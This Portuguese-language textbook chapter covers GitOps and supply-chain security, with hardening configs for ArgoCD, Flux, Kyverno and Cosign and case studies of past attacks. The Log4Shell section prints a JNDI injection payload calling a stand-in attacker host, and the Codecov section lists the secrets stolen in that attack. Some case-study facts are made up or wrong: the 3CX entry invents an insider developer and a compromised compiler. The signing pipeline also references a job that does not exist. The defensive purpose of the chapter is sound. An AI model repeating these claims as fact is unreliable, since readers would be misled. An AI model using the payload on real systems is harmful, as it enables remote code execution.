---
layout: default
title: "13-gitops-e-supply-chain"
---

# Capítulo 13 — GitOps e Segurança da Cadeia de Suprimentos

## Introducao

A cadeia de suprimentos de software tornou-se o vetor de ataque mais prolifico dos ultimos anos. Cada dependencia, cada acao de build, cada artefato publicado e um ponto potencial de comprometimento. O SolarWinds, o 3CX, o xz-utils — todos demonstraram que confiar sem verificar e uma receita para o desastre.

GitOps oferece um modelo onde o Git se torna a unica fonte de verdade para infraestrutura e aplicacoes. Mas sem seguranca na cadeia de suprimentos, GitOps apenas move o problema: em vez de atacar o ambiente de producao diretamente, o adversario ataca o repositorio, o pipeline de build ou a dependencia transitiva.

Este capitulo cobre os fundamentos do GitOps, a seguranca da cadeia de suprimentos, e como integrar ambos em um fluxo defensivo que reduz significativamente a superficie de ataque.

---

## 1. GitOps Fundamentals

### 1.1 Principios do GitOps

GitOps nao e apenas CI/CD com Git. E um modelo operacional com quatro principios fundamentais:

```yaml
# Principios GitOps - Definicao Operacional
gitops_principles:
  declarative:
    description: "O estado desejado do sistema deve ser declarativo"
    example: "Kubernetes manifests YAML, Helm values, Terraform HCL"
    anti_pattern: "Scripts imperativos que modificam estado"
    
  versioned:
    description: "O estado desejado e armazenado em repositorios versionados"
    example: "Git como store com branch protection"
    guarantee: "Historico completo, auditavel, reversivel"
    
  automated:
    description: "As mudancas sao aplicadas automaticamente"
    mechanism: "Controladores de reconciliacao"
    rule: "Nunca apply manual em producao"
    
  self_healing:
    description: "Controladores detectam e corrigem desvios do estado declarado"
    pattern: "Reconciliation loop"
    drift_detection: "Comparacao continua entre estado desejado e real"
```

### 1.2 Pull-based vs Push-based Deployment

```yaml
# Modelo Pull vs Push
deployment_models:
  push_based:
    description: "CI/CD pusha mudancas para o cluster"
    tools: ["Jenkins", "GitHub Actions", "GitLab CI"]
    security_concern: "Pipeline precisa de credenciais de acesso ao cluster"
    risk: "Comprometimento do CI/CD = comprometimento do cluster"
    
  pull_based:
    description: "Agente no cluster puxa mudancas do Git"
    tools: ["ArgoCD", "Flux", "Crossplane"]
    security_benefit: "Agente so precisa de acesso ao Git, nao ao cluster"
    advantage: "Blast radius limitado: o agente so aplica o que esta declarado"
```

### 1.3 Git como Single Source of Truth

```yaml
# Estrutura recomendada para repositorios GitOps
repository_structure:
  base_path: "clusters/"
  layout:
    cluster_name:
      - "applications/"    # ArgoCD Application CRDs
      - "infrastructure/"  # Operators e configs do cluster
      - "secrets/"         # SOPS/SealedSecrets encriptados
      - "policies/"        # OPA/Gatekeeper/Kyverno
      
  example:
    clusters/
      production/
        applications/
          frontend.yaml
          backend.yaml
          database.yaml
        infrastructure/
          cert-manager.yaml
          ingress-nginx.yaml
          monitoring.yaml
        secrets/
          database-credentials.enc.yaml  # SOPS encriptado
        policies/
          require-labels.yaml
          restrict-image-registries.yaml
```

### 1.4 Reconciliation Loop

```yaml
# O ciclo de reconciliacao
reconciliation_loop:
  steps:
    - step: "Fetch"
      description: "Busca o estado declarado do repositorio Git"
      interval: "Default 3-5 minutos"
      
    - step: "Compare"
      description: "Compara estado desejado vs estado real do cluster"
      mechanism: "Server-side diff"
      
    - step: "Act"
      description: "Aplica diferencas se houver desvio"
      options:
        - "Auto-sync: aplica automaticamente"
        - "Manual-sync: requer aprovacao humana"
        
    - step: "Verify"
      description: "Verifica se a mudanca foi aplicada corretamente"
      health_checks: ["Readiness", "Liveness", "Custom probes"]
      
  security_implication: |
    Se o adversario comprometer o repositorio Git, o reconciliation loop
    aplicara automaticamente as mudancas malignas. Por isso, proteger
    o repositorio Git e TANTO importante quanto proteger o cluster.
```

---

## 2. Supply Chain Security

### 2.1 O que e Software Supply Chain

```yaml
# Componentes da cadeia de suprimentos
supply_chain_components:
  source:
    - "Codigo fonte em repositorios"
    - "Dependencias de terceiros"
    - "Configuracoes e secrets"
    
  build:
    - "Sistemas de build (Jenkins, GitHub Actions)"
    - "Dependencias de build (compiladores, ferramentas)"
    - "Scripts de build e testes"
    
  artifact:
    - "Imagens Docker"
    - "Bibliotecas publicadas"
    - "Pacotes (npm, PyPI, Maven)"
    - "Binarios e executaveis"
    
  distribution:
    - "Registros de imagens (Docker Hub, ECR, GCR)"
    - "Repositorios de pacotes"
    - "CDNs de distribuicao"
    
  deployment:
    - "GitOps controllers"
    - "Helm charts"
    - "Operadores Kubernetes"
    
  runtime:
    - "Dependencias transitorias carregadas em runtime"
    - "Plugins e extensoes"
    - "Configuracoes dinamicas"
```

### 2.2 Vetores de Ataque na Cadeia de Suprimentos

```yaml
# Vetores de ataque documentados
attack_vectors:
  dependency_confusion:
    description: "Publicar pacote malicioso com nome identico a pacote interno"
    example: "Atacante publica 'internal-lib' no npm publico"
    defense: "Scoped packages, lock files, verificacao de assinatura"
    
  typosquatting:
    description: "Publicar pacote com nome similar a popular"
    examples:
      - "event-stream vs eventstream"
      - "colors.js vs colours.js"
    defense: "Nomeacao padronizada, verificacao automatizada"
    
  compromised_maintainer:
    description: "Conta de mantenedor comprometida, update malicioso"
    example: "event-stream npm (2018)"
    defense: "2FA obrigatorio, revisao de updates, SBOM"
    
  malicious_dependency:
    description: "Dependencia legima que introduz comportamento malicioso"
    example: "ua-parser-js (2021) - cryptominer em versao comprometida"
    defense: "Pin de versao, verificacao de hash, audit automatizado"
    
  compromised_build:
    description: "Sistema de build comprometido injeta malware no artefato"
    example: "SolarWinds (2020) - build pipeline modificada"
    defense: "Builds reproduziveis, attestations, SLSA"
    
  compromised_artifact:
    description: "Artefato substituido ou modificado no registro"
    example: "Imagem Docker modificada apos build"
    defense: "Assinatura de artefatos, verificacao no deploy"
    
  transitive_dependency:
    description: "Vulnerabilidade em dependencia de dependencia"
    example: "Log4Shell (2021) - Log4j em apps Java"
    defense: "SBOM completo, dependabot/renovate, monitoramento"
```

### 2.3 Casos Documentados de Ataques

#### SolarWinds (2020)

```yaml
# SolarWinds - O ataque de supply chain mais sofisticado
solarwinds:
  when: "Março a Dezembro de 2020"
  what: "Comprometimento do software Orion (gestao de TI)"
  victims: ["US Treasury", "US Treasury", "FireEye", "Microsoft"]
  
  attack_chain:
    1: "Invasao da rede SolarWinds em fevereiro de 2020"
    2: "Identificacao do processo de build do Orion"
    3: "Insercao do backdoor SUNBURST no codigo fonte"
    4: "Compilacao normal - o malware soh existia no build final"
    5: "Distribuicao via atualizacao legitima do Orion (v2019.4 HF 5 a v2020.2.1)"
    6: "Ativacao do SUNBURST apenas em ambientes de interesse"
    7: "Comunicacao C2 via DNS (elegante e dificil de detectar)"
    
  impact:
    duration: "9+ meses indetectavel"
    scope: "18.000+ organizacoes afetadas"
    technique: "Supply chain poisoning through compromised build"
    
  lessons_learned:
    - "Builds precisam ser reproduziveis e verificaveis"
    - "Attestations de provenance devem ser validadas"
    - "Zero-trust deve se aplicar a artefatos internos"
    - "Monitoramento de anomalias em tempo de execucao e critico"
    
  defense_measures:
    - "SLSA Level 3+ para artefatos criticos"
    - "Assinatura com Cosign/Notary"
    - "SBOM gerado e verificado em cada build"
    - "Integridade verificada antes de cada deploy"
```

#### 3CX (2023)

```yaml
# 3CX - Ataque de supply chain via compilador comprometido
threecx:
  when: "Marco de 2023"
  what: "Comprometimento do cliente desktop 3CX VoIP"
  
  attack_chain:
    1: "Comprometimento do desenvolvedor Kim Jong-soo"
    2: "Insercao de codigo malicioso no repositorio 3CX"
    3: "Build automatizado compilou e distribuiu o malware"
    4: "600.000+ organizacoes afetadas, incluindo empresas Fortune 500"
    5: "Ligacao com o grupo Lazarus (DPRK)"
    
  malware: |
    O malware (Gopuram) era modular e se ativava apenas em
    organizacoes especificas de interesse. A maioria dos
    endpoints nunca seria afetada, tornando a deteccao
    extremamente dificil.
    
  lessons_learned:
    - "Branch protection e code review sao insuficientes quando o atacante e insider"
    - "SLSA supply chain security precisa cobrir o processo de build completo"
    - "EDR so detecta apos comprometimento - prevencao e mais importante"
```

#### xz-utils Backdoor (CVE-2024-3094)

```yaml
# xz-utils - Backdoor implantada via social engineering
xz_backdoor:
  when: "Marco de 2024"
  what: "Backdoor no xz-utils (compRESSao de dados em Linux)"
  
  attack_chain:
    1: "Atacante 'Jia Tan' contribuiu por 2+ anos no projeto"
    2: "Construiu confianca com o mantenedor original Lasse Collin"
    3: "Pressao sobre o mantenedor burnout para conceder permissao de commit"
    4: "Insercao gradual de mudancas aparentemente innocuas"
    5: "Commit final continha a backdoor que afeta SSH via systemd"
    
  impact: |
    A backdoor permitia autenticacao remota no OpenSSH compilado
    contra o xz-utils comprometido. Afetaria praticamente todos
    os servidores Linux se distribuida em pacotes principais.
    
  save: |
    Andres Freund (Microsoft) notou uma degradacao de 500ms
    no SSH e investigou, descobrindo a backdoor antes da
    distribuicao em pacotes principais do Linux.
    
  lessons_learned:
    - "Contribuidores de longa data podem ser atacantes pacientes"
    - "Repos criticos precisam de multiples mainteners distribuidos"
    - "Auditoria de dependencias criticas deve ser continua"
    - "SLSA Level 3+ teria dificultado significativamente o ataque"
```

#### Codecov (2021)

```yaml
# Codecov - Comprometimento de script de build
codecov:
  when: "Janeiro a Abril de 2021"
  what: "Script de upload de covar modificado para exfiltrar dados"
  
  attack_chain:
    1: "Atacante acessou o repositorio GitHub do Codecov"
    2: "Modificou o Bash Uploader Script para exfiltrar variaveis de ambiente"
    3: "As mudancas passaram sem revisao detalhada (script era 'simples')"
    4: "Vazaram tokens de CI/CD, chaves AWS, credenciais de banco de dados"
    5: "Ataque afetou milhares de clientes por 2 meses"
    
  exfiltration_targets:
    - "CODECOV_TOKEN"
    - "AWS_SECRET_ACCESS_KEY"
    - "GITHUB_TOKEN"
    - "DOCKERHUB_USERNAME/PASSWORD"
    - "Any env var containing 'KEY', 'TOKEN', 'SECRET'"
    
  lessons_learned:
    - "Scripts de build sao vetores de ataque subestimados"
    - "Mudancas em scripts devem ter review especifico"
    - "Variaveis de ambiente devem ser minimizadas e rotacionadas"
```

#### event-stream npm (2018)

```yaml
# event-stream - Comprometimento de mantenedor
event_stream:
  when: "Setembro de 2018"
  what: "Dependencia maliciosa injetada via mantenedor comprometido"
  
  attack_chain:
    1: "Projeto popular (2M downloads/semana) com mantenedor burnout"
    2: "Atacante se ofereceu para manter o pacote"
    3: "Mantenedor transferiu acesso"
    4: "Atacante adicionou 'flatmap-stream' como dependencia"
    5: "flatmap-stream continha malware que roubava dados de carteiras Bitcoin"
    
  impact:
    scope: "Apenas afetou desenvolvedores usando Copay (carteira Bitcoin)"
    detection: "3 meses antes de ser detectado"
    downloads: "8M+ downloads durante periodo comprometido"
    
  lessons_learned:
    - "Mantenedores fatigados sao risco de seguranca"
    - "Transferencia de ownership deve ter processo formal"
    - "Dependencias de dependencias precisam ser auditadas"
```

#### ua-parser-js (2021)

```yaml
# ua-parser-js - Pacote popular comprometido
ua_parser:
  when: "Outubro de 2021"
  what: "Versoes comprometidas continham cryptominer e credential stealer"
  
  attack_chain:
    1: "Conta de mantenedor comprometida"
    2: "Versoes 0.7.29, 0.8.0, 1.0.0 publicadas com malware"
    3: "Pacote tem 7M+ downloads por semana"
    4: "Malware: cryptominer (XMRig) + credential stealer"
    
  affected:
    - "6M+ instalacoes estimadas na semana do ataque"
    - "Pacote usado por Facebook, Amazon, IBM, Oracle"
    
  lessons_learned:
    - "Autenticacao de mantenedores com 2FA e obrigatoria"
    - "Monitorar publicacoes inesperadas em pacotes populares"
    - "Lock files previnem atualizacoes automaticas para versoes comprometidas"
```

#### Log4Shell (2021)

```yaml
# Log4Shell - Vulnerabilidade em dependencia transitiva
log4shell:
  when: "Dezembro de 2021"
  cve: "CVE-2021-44228"
  cvss: "10.0 (Critico)"
  what: "Remote Code Execution via JNDI injection no Log4j 2"
  
  attack_mechanism: |
    O Log4j 2 permitia injecao de JNDI via strings de log.
    Um atacante podia enviar payload como:
    ${jndi:ldap://attacker.com/malicious}
    O Log4j resolveria o JNDI e carregaria codigo remoto.
    
  impact:
    scope: "Praticamente todo software Java afetado"
    reach: "Milhoes de aplicacoes, incluindo VMware, Apache, Minecraft"
    detection_time: "Vulnerabilidade existia desde 2013"
    
  supply_chain_aspect: |
    Log4j era uma dependencia transitiva na maioria dos
    projetos. Desenvolvedores nem sabiam que estavam usando.
    Isso demonstrou a criticidade de SBOM e visibilidade
    de dependencias.
    
  lessons_learned:
    - "SBOM completo e visibilidade de dependencias e critico"
    - "Dependencias transitorias podem conter vulnerabilidades devastadoras"
    - "Monitoramento de CVEs em dependencias deve ser continuo"
    - "Software Composition Analysis (SCA) nao e opcional"
```

### 2.4 SLSA Framework

```yaml
# SLSA - Supply-chain Levels for Software Artifacts
slsa_framework:
  purpose: "Framework de seguranca da cadeia de suprimentos"
  levels:
    level_0:
      name: "Nenhum controle"
      requirements: "Nenhum"
      description: "Builds podem ser qualquer coisa"
      
    level_1:
      name: "Provenancia"
      requirements:
        - "Builds produzem provenance (metadados do build)"
        - "Provenance e anexada ao artefato"
      protection: "Diferencia build legitima de artefato forjado"
      
    level_2:
      name: "Provenancia verificada"
      requirements:
        - "Builds sao executados em plataforma de build gerenciada"
        - "Plataforma gera provenance assinada"
        - "Assinatura e verificavel pelo consumidor"
      protection: "Impede que atacante forgeie provenance"
      
    level_3:
      name: "Builds isolados"
      requirements:
        - "Plataforma de build isolada (sandbox)"
        - "Acesso ao build restrito aprovacao"
        - "Provenance nao pode ser modificada pelo atacante"
      protection: "Mesmo insider nao pode injetar codigo nao declarado"
      
    level_4:
      name: "Controle humano"
      requirements:
        - "Todas as mudancas revisadas por humanos"
        - "Mudancas aprovadas por maintainer diferente do autor"
        - "Build completamente reproduzivel"
      protection: "Protecao contra comprometimento de mantenedor"
```

---

## 3. ArgoCD Security

### 3.1 RBAC no ArgoCD

```yaml
# ArgoCD RBAC - Configuracao de seguranca
apiVersion: v1
kind: ConfigMap
metadata:
  name: argocd-rbac-cm
  namespace: argocd
data:
  # Politica de acesso padrao: negar tudo
  policy.default: role:readonly
  
  # Politicas de acesso
  policy.csv: |
    # Admins podem fazer tudo
    p, role:admin, applications, *, */*, allow
    p, role:admin, clusters, *, *, allow
    p, role:admin, repositories, *, *, allow
    p, role:admin, logs, *, *, allow
    p, role:admin, exec, *, */*, allow
    
    # Developers podem ver e sync em dev/staging
    p, role:developer, applications, get, dev-staging/*, allow
    p, role:developer, applications, sync, dev-staging/*, allow
    p, role:developer, applications, action/*, dev-staging/*, allow
    p, role:developer, logs, get, dev-staging/*, allow
    
    # Viewers so podem ver
    p, role:viewer, applications, get, */*, allow
    p, role:viewer, repositories, get, *, allow
    
    # Binding de usuarios a roles
    g, admins, role:admin
    g, developers, role:developer
    g, viewers, role:viewer
    
    # RESTRICOES DE SEGURANCA:
    # Negar sync manual em producao
    p, role:developer, applications, sync, production/*, deny
    p, role:developer, applications, delete, production/*, deny
    
    # Negar acesso a secrets
    p, role:developer, applications, get, */*, allow
    # (secrets sao encriptados e so admin ve plaintext)
    
    # Negar exec em pods
    p, role:developer, exec, create, */*, deny
```

### 3.2 Repositorios e Credenciais

```yaml
# Configuracao segura de repositorios
apiVersion: v1
kind: Secret
metadata:
  name: argocd-repo-creds
  namespace: argocd
  labels:
    argocd.argoproj.io/secret-type: repository
type: Opaque
stringData:
  type: git
  url: https://github.com/myorg/gitops-infra
  # Usar GitHub App ou token de curta duracao
  githubAppId: "12345"
  githubAppInstallationId: "67890"
  githubAppPrivateKey: |
    -----BEGIN RSA PRIVATE KEY-----
    ...chave em producao...
    -----END RSA PRIVATE KEY-----
  # NUNCA usar username/password
  # NUNCA usar tokens de longa duracao
  # NUNCA armazenar credenciais em plaintext
```

```yaml
# Projeto restrito
apiVersion: argoproj.io/v1alpha1
kind: AppProject
metadata:
  name: production
  namespace: argocd
spec:
  description: "Projeto de producao com restricoes maximas"
  
  # Fontes permitidas
  sourceRepos:
    - "https://github.com/myorg/gitops-infra"
    - "https://charts.bitnami.com/bitnami"  # Chart repos oficiais
    
  # Destinos permitidos
  destinations:
    - server: "https://kubernetes.default.svc"
      namespace: "production"
      
  # Namespaces permitidos
  clusterResourceWhitelist:
    - group: ""
      kind: Namespace
      
  namespaceResourceWhitelist:
    - group: "apps"
      kind: Deployment
    - group: "apps"
      kind: StatefulSet
    - group: ""
      kind: Service
    - group: ""
      kind: ConfigMap
    - group: "networking.k8s.io"
      kind: Ingress
      
  # RESTRICOES DE SEGURANCA:
  # Nao permitir CRDs ou ClusterRoles
  clusterResourceBlacklist:
    - group: "*"
      kind: "*"
      
  # Somente namespaces especificos
  namespaceResourceBlacklist:
    - group: ""
      kind: Secret
      
  # Rollbacks requerem aprovacao
  roles:
    - name: deployer
      description: "Pode fazer sync em staging"
      policies:
        - p, proj:production:deployer, applications, sync, production/*, allow
      groups:
        - deployers
        
    - name: approver
      description: "Pode aprovar sync em producao"
      policies:
        - p, proj:production:approver, applications, sync, production/*, allow
        - p, proj:production:approver, applications, override, production/*, allow
      groups:
        - approvers
```

### 3.3 Configuracao Completa Segura do ArgoCD

```yaml
# argocd-cmd-params-cm - Parametros de seguranca
apiVersion: v1
kind: ConfigMap
metadata:
  name: argocd-cmd-params-cm
  namespace: argocd
data:
  # Server de RBAC
  server.rbac.log.enforce.enable: "true"
  
  # Rate limiting
  server.ratelimit.burst: "50"
  server.ratelimit.burstunused: "30"
  
  # TLS obrigatorio
  server.insecure: "false"
  
  # Timeout para operacoes
  controller.operation.processors: "10"
  controller.status.processors: "20"
  
  # Reconciliacao
  controller.self.heal.timeout.seconds: "5"
  controller.repo.server.timeout.seconds: "60"
```

```yaml
# SSO com Dex
apiVersion: v1
kind: ConfigMap
metadata:
  name: argocd-cm
  namespace: argocd
data:
  url: https://argocd.myorg.com
  
  # Configuracao Dex (SSO)
  dex.config: |
    connectors:
      - type: github
        id: github
        name: GitHub
        config:
          clientID: $argocd-dex-server-github-clientID
          clientSecret: $argocd-dex-server-github-clientSecret
          orgs:
            - name: myorg
              teams:
                - platform-team    # Apenas esta equipe tem acesso
          redirectURI: https://argocd.myorg.com/api/dex/callback
          
  # Configuracao de session
  admin.enabled: "false"  # DESABILITAR admin padrao
  
  # Anonimo desabilitado
  users.anonymous.enabled: "false"
  
  # Status badges desabilitados (evita information disclosure)
  statusbadge.enabled: "false"
  
  # URL de notificacoes
  notifications.enabled: "true"
```

---

## 4. Flux Security

### 4.1 Flux v2 Security Features

```yaml
# Flux v2 - Configuracao de seguranca
apiVersion: kustomize.toolkit.fluxcd.io/v1
kind: Kustomization
metadata:
  name: infrastructure
  namespace: flux-system
spec:
  interval: 10m
  path: ./clusters/production/infrastructure
  prune: true
  sourceRef:
    kind: GitRepository
    name: flux-system
    
  # Seguranca: verificacao de assinatura
  decryption:
    provider: sops
    secretRef:
      name: sops-age
      
  # Seguranca: health checks
  healthChecks:
    - apiVersion: apps/v1
      kind: Deployment
      name: ingress-nginx
      namespace: ingress-nginx
      
  # Seguranca: timeout e retentativas
  timeout: 5m
  retryInterval: 2m
  
  # Seguranca: invalidacao de cache
  force: false
  wait: true
  dependsOn:
    - name: cert-manager
```

### 4.2 Image Automation

```yaml
# Automaticamente atualizar imagens baseadas em tags
apiVersion: image.toolkit.fluxcd.io/v1beta2
kind: ImageUpdateAutomation
metadata:
  name: flux-system
  namespace: flux-system
spec:
  interval: 30m
  sourceRef:
    kind: GitRepository
    name: flux-system
  git:
    checkout:
      ref:
        branch: main
    commit:
      author: fluxbot
      message: "chore: update image tags"
      email: fluxbot@myorg.com
    push:
      branch: main
      
  # Seguranca: restricao de imagens
  update:
    path: ./clusters
    strategy: Alphabetical
    
---
# Image Repository - apenas imagens de registry aprovado
apiVersion: image.toolkit.fluxcd.io/v1beta2
kind: ImageRepository
metadata:
  name: app-images
  namespace: flux-system
spec:
  image: myregistry.azurecr.io/myorg/app
  interval: 1m
  
  # Seguranca: exclusao de tags nao seguras
  excludeTags:
    - latest
    - dev-*
    - "*-rc*"
    - "*-beta*"
    
  # Seguranca: verificacao de TLS
  provider: generic
  secretRef:
    name: registry-credentials
```

### 4.3 Policy Enforcement com Kyverno

```yaml
# Politica: bloquear imagens nao assinadas
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signatures
  annotations:
    policies.kyverno.io/title: "Verificar assinatura de imagens"
    policies.kyverno.io/category: Supply Chain Security
    policies.kyverno.io/severity: high
    policies.kyverno.io/subject: Pod
spec:
  validationFailureAction: Enforce
  background: false
  webhookTimeoutSeconds: 30
  
  rules:
    - name: check-image-signature
      match:
        any:
          - resources:
              kinds:
                - Pod
              namespaces:
                - production
                - staging
                
      verifyImages:
        - imageReferences:
            - "myregistry.azurecr.io/myorg/*"
            - "ghcr.io/myorg/*"
          attestors:
            - entries:
                - keys:
                    publicKeys: |-
                      -----BEGIN PUBLIC KEY-----
                      MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
                      -----END PUBLIC KEY-----
                  rekor:
                    url: https://rekor.sigstore.dev
                    tlogPublicKeys: |-
                      ...chave publica do Rekor...
                      
        - imageReferences:
            - "docker.io/*"
            - "quay.io/*"
          attestors:
            - entries:
                - keys:
                    publicKeys: |-
                      -----BEGIN PUBLIC KEY-----
                      ...outra chave...
                      -----END PUBLIC KEY-----
```

```yaml
# Politica: bloquear imagens de registries nao aprovados
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-registries
spec:
  validationFailureAction: Enforce
  background: true
  
  rules:
    - name: validate-registries
      match:
        any:
          - resources:
              kinds:
                - Pod
              namespaces:
                - production
                - staging
                
      validate:
        message: >
          Imagems devem ser do registry aprovado.
          Registries permitidos: myregistry.azurecr.io, ghcr.io/myorg
        pattern:
          spec:
            containers:
              - image: "myregistry.azurecr.io/myorg/* | ghcr.io/myorg/*"
            initContainers:
              - image: "myregistry.azurecr.io/myorg/* | ghcr.io/myorg/*"
```

---

## 5. Artifact Signing

### 5.1 Sigstore/Cosign

```yaml
# Instalacao do Cosign
install_cosign:
  method: "Binary download"
  command: |
    # Para Linux amd64
    wget -q https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64
    chmod +x cosign-linux-amd64
    sudo mv cosign-linux-amd64 /usr/local/bin/cosign
    
  # Verificacao
  verify: |
    cosign version
    # cosign version v2.2.4
```

```bash
#!/bin/bash
# Script: sign-image.sh
# Assina uma imagem Docker com Cosign

set -euo pipefail

IMAGE=$1
TAG=${2:-latest}
FULL_IMAGE="${IMAGE}:${TAG}"

echo "=== Assinando imagem: ${FULL_IMAGE} ==="

# Login no registry (usando workload identity em cloud)
# Em AWS:
# aws ecr get-login-password --region us-east-1 | \
#   docker login --username AWS --password-stdin 123456789.dkr.ecr.us-east-1.amazonaws.com

# Assinar com Cosign (usando chave ou keyless)
# Keyless (recomendado): usa OIDC identity via Sigstore
cosign sign \
  --yes \
  --certificate-identity "https://github.com/myorg/myapp/.github/workflows/build.yml@refs/heads/main" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  ${FULL_IMAGE}

# Assinar com chave (alternativa)
# cosign sign -key cosign.key ${FULL_IMAGE}

echo "=== Imagem assinada com sucesso ==="

# Adicionar SBOM como annotation
SBOM_FILE="sbom.spdx.json"
if [ -f "${SBOM_FILE}" ]; then
  echo "=== Adicionando SBOM como attestation ==="
  cosign attest \
    --predicate ${SBOM_FILE} \
    --type spdxjson \
    --certificate-identity "https://github.com/myorg/myapp/.github/workflows/build.yml@refs/heads/main" \
    --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
    ${FULL_IMAGE}
fi

# Adicionar SLSA provenance
PROVENANCE_FILE="provenance.json"
if [ -f "${PROVENANCE_FILE}" ]; then
  echo "=== Adicionando SLSA Provenance ==="
  cosign attest \
    --predicate ${PROVENANCE_FILE} \
    --type slsaprovenance \
    --certificate-identity "https://github.com/myorg/myapp/.github/workflows/build.yml@refs/heads/main" \
    --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
    ${FULL_IMAGE}
fi

echo "=== Pipeline de assinatura completo ==="
```

### 5.2 Verificacao de Imagens

```bash
#!/bin/bash
# Script: verify-image.sh
# Verifica assinatura e attestations de uma imagem

set -euo pipefail

IMAGE=$1
TAG=${2:-latest}
FULL_IMAGE="${IMAGE}:${TAG}"

echo "=== Verificando imagem: ${FULL_IMAGE} ==="

# Verificar assinatura
echo "[1/4] Verificando assinatura..."
cosign verify \
  --certificate-identity "https://github.com/myorg/myapp/.github/workflows/build.yml@refs/heads/main" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  ${FULL_IMAGE}

echo "[2/4] Assinatura VALIDA"

# Verificar SBOM
echo "[3/4] Verificando SBOM..."
cosign verify-attestation \
  --type spdxjson \
  --certificate-identity "https://github.com/myorg/myapp/.github/workflows/build.yml@refs/heads/main" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  ${FULL_IMAGE} 2>/dev/null

echo "[4/4] Verificacao completa - IMAGEM SEGURA"

# Extrair e analisar SBOM
echo "=== Extraindo SBOM para analise ==="
cosign verify-attestation \
  --type spdxjson \
  ${FULL_IMAGE} 2>/dev/null | \
  jq -r '.payload | @base64d' | \
  jq '.predicate' > /tmp/sbom-extracted.json

echo "=== SBOM extraido em /tmp/sbom-extracted.json ==="
```

### 5.3 Pipeline Completo de Assinatura

```yaml
# GitHub Actions: Pipeline completa de assinatura
name: Build, Sign, and Publish
on:
  push:
    branches: [main]
    
permissions:
  contents: read
  packages: write
  id-token: write  # Necessario para keyless signing
  
jobs:
  build-and-sign:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        
      - name: Setup Cosign
        uses: sigstore/cosign-installer@v3.5.0
        
      - name: Login to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
          
      - name: Build and push
        uses: docker/build-push-action@v5
        with:
          push: true
          tags: |
            ghcr.io/${{ github.repository }}:${{ github.sha }}
            ghcr.io/${{ github.repository }}:latest
            
      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          image: ghcr.io/${{ github.repository }}:${{ github.sha }}
          format: spdx-json
          output-file: sbom.spdx.json
          
      - name: Generate Provenance
        uses: actions/slsa-github-generator@v1.10.0
        with:
          base64-subjects: "${{ needs.build.outputs.digest }}"
          
      - name: Sign with Cosign
        run: |
          cosign sign \
            --yes \
            --certificate-identity "https://github.com/${{ github.repository }}/.github/workflows/build.yml@refs/heads/main" \
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
            ghcr.io/${{ github.repository }}:${{ github.sha }}
            
      - name: Attest SBOM
        run: |
          cosign attest \
            --predicate sbom.spdx.json \
            --type spdxjson \
            --yes \
            --certificate-identity "https://github.com/${{ github.repository }}/.github/workflows/build.yml@refs/heads/main" \
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
            ghcr.io/${{ github.repository }}:${{ github.sha }}
            
      - name: Verify Signature
        run: |
          cosign verify \
            --certificate-identity "https://github.com/${{ github.repository }}/.github/workflows/build.yml@refs/heads/main" \
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
            ghcr.io/${{ github.repository }}:${{ github.sha }}
```

---

## 6. Provenance and Attestation

### 6.1 SLSA Provenance

```yaml
# Gerar SLSA Provenance com slsa-verifier
slsa_provenance:
  description: "Metadata que prova de onde um artefato veio e como foi construido"
  
  example_provenance:
    _type: "https://slsa.dev/provenance/v0.2"
    subject:
      - name: "ghcr.io/myorg/myapp"
        digest:
          sha256: "abc123..."
    predicate:
      builder:
        id: "https://github.com/actions/runner"
      buildType: "https://github.com/actions/checkout"
      invocation:
        configSource:
          uri: "git+https://github.com/myorg/myapp.git"
          digest:
            sha1: "def456..."
          entryPoint: ".github/workflows/build.yml"
      metadata:
        buildInvocationId: "12345678"
        buildStartedOn: "2024-01-15T10:00:00Z"
        buildFinishedOn: "2024-01-15T10:05:00Z"
        completeness:
          parameters: true
          environment: true
          materials: true
        reproducible: true
      materials:
        - uri: "git+https://github.com/myorg/myapp.git"
          digest:
            sha1: "def456..."
```

### 6.2 SBOM Attestation

```python
#!/usr/bin/env python3
"""
Script: generate_sbom.py
Gera SBOM em formato SPDX e atesta com Cosign
"""

import subprocess
import json
import os
from datetime import datetime


def generate_sbom(image: str, output_file: str = "sbom.spdx.json") -> str:
    """Gera SBOM usando Syft"""
    print(f"[INFO] Gerando SBOM para: {image}")
    
    cmd = [
        "syft", "packages", image,
        "--output", "spdx-json",
        output_file
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"[ERROR] Falha ao gerar SBOM: {result.stderr}")
        raise SystemExit(1)
    
    print(f"[INFO] SBOM gerado: {output_file}")
    return output_file


def analyze_sbom(sbom_file: str) -> dict:
    """Analisa SBOM em busca de vulnerabilidades conhecidas"""
    print(f"[INFO] Analisando SBOM: {sbom_file}")
    
    with open(sbom_file, "r") as f:
        sbom = json.load(f)
    
    analysis = {
        "total_packages": len(sbom.get("packages", [])),
        "packages_with_vulns": 0,
        "licenses": set(),
        "unknown_packages": []
    }
    
    for package in sbom.get("packages", []):
        license_info = package.get("licenseConcluded", "UNKNOWN")
        analysis["licenses"].add(str(license_info))
        
        # Verificar pacotes sem licenca clara
        if license_info in ("UNKNOWN", "NOASSERTION", "NONE"):
            analysis["unknown_packages"].append({
                "name": package.get("name"),
                "version": package.get("versionInfo"),
                "spdxId": package.get("SPDXID")
            })
    
    analysis["licenses"] = list(analysis["licenses"])
    
    print(f"[INFO] Pacotes encontrados: {analysis['total_packages']}")
    print(f"[INFO] Licencas encontradas: {len(analysis['licenses'])}")
    
    if analysis["unknown_packages"]:
        print(f"[WARN] {len(analysis['unknown_packages'])} pacotes sem licenca clara")
    
    return analysis


